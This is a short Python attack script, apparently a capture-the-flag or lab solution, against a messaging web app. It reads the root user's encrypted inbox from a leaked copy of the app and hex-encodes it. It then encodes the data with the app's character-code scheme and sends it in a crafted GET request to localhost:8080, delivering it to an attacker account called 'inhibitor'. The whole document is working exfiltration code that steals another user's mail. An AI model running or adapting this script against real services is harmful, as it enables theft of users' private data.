
#!/usr/bin/env python3
"""
Alternative exfiltration: Send root's encrypted inbox file to attacker
"""
import requests
import random

def scramble(s):
    return '-'.join(str(ord(c)) for c in s)

# Read root's encrypted inbox
with open('leaked_app/inboxes/114-111-111-116.inbox', 'rb') as f:
    encrypted_data = f.read()

# Convert to hex string
hex_data = encrypted_data.hex()

# Send to inhibitor
exfil_msg = '{"from":"exfil","subject":"ROOT_INBOX","date":"2025","body":"' + hex_data + '"}'
exfil_msg += '//END_MSG//'

pad = 16 - (len(exfil_msg) % 16)
if pad > 0 and pad != 16:
    exfil_msg += '\x00' * pad

rand = str(random.random()).replace('.', '')
url = f"http://localhost:8080/${rand}?pw={scramble('123456')}&un={scramble('inhibitor')}&msg={scramble(exfil_msg)}&to={scramble('inhibitor')}.inbox"

print("Exfiltrating root's encrypted inbox...")
try:
    requests.get(url, timeout=5)
    print("Done! Check inhibitor's inbox")
except:
    print("Done! Check inhibitor's inbox")
